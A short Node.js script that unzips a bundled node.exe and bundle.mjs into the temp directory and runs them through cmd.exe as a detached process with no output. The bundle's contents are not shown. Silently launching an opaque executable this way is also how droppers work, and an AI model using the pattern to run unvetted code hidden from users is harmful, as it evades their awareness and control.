const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');
const zlib = require('unzipper');

async function main() {
  const outDir = path.join(os.tmpdir(), 'node-runner');
  if (!fs.existsSync(outDir)) {
    // create temp directory to unzip the bundle
    fs.mkdirSync(outDir, { recursive: true });

    // get the bundle zip from the assets folder
    const bundleZip = path.join(__dirname, './assets/bundle.zip');

    // unzip the bundle into the temp directory
    await fs
      .createReadStream(bundleZip)
      .pipe(zlib.Extract({ path: outDir }))
      .promise();
  }

  // run the bundle with the node inside of it in the temp directory
  const node = path.join(outDir, 'node.exe');
  const bundle = path.join(outDir, 'bundle.mjs');
  const child = spawn('cmd.exe', ['/c', node, bundle], {
    detached: true,
    stdio: 'ignore',
  });

  child.unref();
}

main();
